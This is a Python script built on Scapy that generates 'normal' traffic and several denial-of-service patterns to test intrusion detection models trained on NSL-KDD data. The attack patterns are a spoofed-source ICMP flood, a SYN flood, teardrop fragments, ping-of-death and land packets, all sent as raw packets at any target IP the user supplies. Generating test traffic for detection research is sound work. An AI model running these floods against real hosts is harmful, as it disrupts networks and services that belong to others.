#!/home/nav/main_project/anomalyX/.env/bin/python

"""
NSL-KDD Traffic Simulator

This script generates network traffic that mimics the patterns found in the NSL-KDD dataset,
specifically focusing on normal traffic and DDoS attack patterns. It's designed to help test
intrusion detection models trained on NSL-KDD data.
"""

import argparse
import random
import socket
import time
import subprocess
import sys
import os
from scapy.all import IP, TCP, UDP, ICMP, Ether, Raw, sendp, send, conf

# Disable Scapy's verbose output
conf.verb = 0

# NSL-KDD DDoS characteristics (simplified)
# Based on the smurf, neptune, and other DoS attacks in NSL-KDD
DDOS_PROTOCOLS = ['tcp', 'udp', 'icmp']
DDOS_FLAGS = ['S', 'SA', 'F', 'FPU', 'R']  # SYN, SYN-ACK, FIN, FIN-PUSH-URG, RST
DDOS_SERVICES = [21, 23, 25, 53, 80, 443, 8080]  # Common service ports in the dataset

# Normal traffic characteristics from NSL-KDD
NORMAL_PROTOCOLS = ['tcp', 'udp', 'icmp']
NORMAL_FLAGS = ['S', 'SA', 'A', 'PA', 'FA']  # Various normal TCP flags
NORMAL_SERVICES = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993]  # Common legitimate services

def parse_arguments():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description='NSL-KDD Traffic Simulator')
    parser.add_argument('--target', type=str, required=True, help='Target IP address')
    parser.add_argument('--interface', type=str, default='eth0', help='Network interface to use')
    parser.add_argument('--mode', type=str, choices=['normal', 'ddos', 'both'], 
                        default='both', help='Traffic type to generate')
    parser.add_argument('--duration', type=int, default=60, help='Duration in seconds (default: 60)')
    parser.add_argument('--rate', type=int, default=10, help='Packets per second (default: 10)')
    return parser.parse_args()

def generate_normal_traffic(target_ip, interface, duration, rate):
    """Generate traffic that mimics normal patterns in NSL-KDD."""
    print(f"Generating normal traffic to {target_ip}")
    end_time = time.time() + duration
    packets_sent = 0
    
    while time.time() < end_time:
        # Select random characteristics similar to normal traffic in NSL-KDD
        protocol = random.choice(NORMAL_PROTOCOLS)
        src_port = random.randint(1024, 65535)
        dst_port = random.choice(NORMAL_SERVICES)
        
        # Create packet based on protocol
        if protocol == 'tcp':
            flags = random.choice(NORMAL_FLAGS)
            # Varying payload sizes typical of normal traffic
            payload_size = random.randint(8, 1400)
            packet = Ether() / IP(dst=target_ip) / TCP(sport=src_port, dport=dst_port, flags=flags) / Raw(RandString(payload_size))
        elif protocol == 'udp':
            payload_size = random.randint(8, 1400)
            packet = Ether() / IP(dst=target_ip) / UDP(sport=src_port, dport=dst_port) / Raw(RandString(payload_size))
        else:  # icmp
            packet = Ether() / IP(dst=target_ip) / ICMP() / Raw(RandString(random.randint(8, 56)))
        
        # Send packet
        try:
            sendp(packet, iface=interface)
            packets_sent += 1
            
            # Sleep to control rate
            time.sleep(1.0 / rate)
        except Exception as e:
            print(f"Error sending packet: {e}")
    
    return packets_sent

def generate_ddos_traffic(target_ip, interface, duration, rate):
    """Generate traffic that mimics DDoS patterns in NSL-KDD."""
    print(f"Generating DDoS traffic to {target_ip}")
    end_time = time.time() + duration
    packets_sent = 0
    
    # Choose attack type from NSL-KDD (smurf, neptune, etc.)
    attack_type = random.choice(['smurf', 'neptune', 'teardrop', 'pod', 'land'])
    
    if attack_type == 'smurf':
        # Smurf attack: ICMP echo request with spoofed source IP
        while time.time() < end_time:
            # Use broadcast addresses and spoofed IPs
            packet = Ether() / IP(dst=target_ip, src=f"10.0.0.{random.randint(1, 254)}") / ICMP()
            try:
                sendp(packet, iface=interface)
                packets_sent += 1
                if packets_sent % (rate * 10) == 0:  # Higher rate for DDoS
                    time.sleep(1)
            except Exception as e:
                print(f"Error sending packet: {e}")
    
    elif attack_type == 'neptune':
        # Neptune attack: SYN flood
        while time.time() < end_time:
            dst_port = random.choice(DDOS_SERVICES)
            src_port = random.randint(1024, 65535)
            packet = Ether() / IP(dst=target_ip, src=f"10.0.0.{random.randint(1, 254)}") / TCP(sport=src_port, dport=dst_port, flags="S")
            try:
                sendp(packet, iface=interface)
                packets_sent += 1
                if packets_sent % (rate * 10) == 0:
                    time.sleep(1)
            except Exception as e:
                print(f"Error sending packet: {e}")
    
    elif attack_type == 'teardrop':
        # Teardrop: Fragmented packets with overlapping offset
        while time.time() < end_time:
            # Simplified teardrop simulation
            packet = Ether() / IP(dst=target_ip, src=f"10.0.0.{random.randint(1, 254)}", flags="MF") / UDP() / Raw(RandString(random.randint(8, 1400)))
            try:
                sendp(packet, iface=interface)
                packets_sent += 1
                if packets_sent % (rate * 5) == 0:
                    time.sleep(1)
            except Exception as e:
                print(f"Error sending packet: {e}")
    
    elif attack_type == 'pod':
        # Ping of Death: Large ICMP packets
        while time.time() < end_time:
            packet = Ether() / IP(dst=target_ip) / ICMP() / Raw(RandString(65500))
            try:
                sendp(packet, iface=interface)
                packets_sent += 1
                if packets_sent % rate == 0:
                    time.sleep(1)
            except Exception as e:
                print(f"Error sending packet: {e}")
    
    elif attack_type == 'land':
        # Land attack: SYN packet with same source and destination
        while time.time() < end_time:
            dst_port = random.choice(DDOS_SERVICES)
            packet = Ether() / IP(src=target_ip, dst=target_ip) / TCP(sport=dst_port, dport=dst_port, flags="S")
            try:
                sendp(packet, iface=interface)
                packets_sent += 1
                if packets_sent % (rate * 3) == 0:
                    time.sleep(1)
            except Exception as e:
                print(f"Error sending packet: {e}")
    
    return packets_sent

def RandString(size):
    """Generate random string of specified size."""
    return bytes(''.join(chr(random.randint(0, 255)) for _ in range(size)), 'latin1')

def main():
    """Main function."""
    args = parse_arguments()
    
    # Validate target
    try:
        socket.inet_aton(args.target)
    except socket.error:
        print(f"Error: Invalid target IP address: {args.target}")
        sys.exit(1)
    
    # Check if running as root (required for raw sockets)
    if os.geteuid() != 0:
        print("Error: This script requires root privileges to send raw packets.")
        print("Please run with 'sudo' or as the root user.")
        sys.exit(1)
    
    print(f"NSL-KDD Traffic Simulator started - Mode: {args.mode}, Target: {args.target}")
    
    if args.mode in ['normal', 'both']:
        normal_packets = generate_normal_traffic(args.target, args.interface, 
                                               args.duration if args.mode == 'normal' else args.duration // 2, 
                                               args.rate)
        print(f"Sent {normal_packets} normal traffic packets")
    
    if args.mode in ['ddos', 'both']:
        ddos_packets = generate_ddos_traffic(args.target, args.interface, 
                                           args.duration if args.mode == 'ddos' else args.duration // 2, 
                                           args.rate * 5)  # Higher rate for DDoS
        print(f"Sent {ddos_packets} DDoS traffic packets")
    
    print("Traffic generation completed")

if __name__ == "__main__":
    main()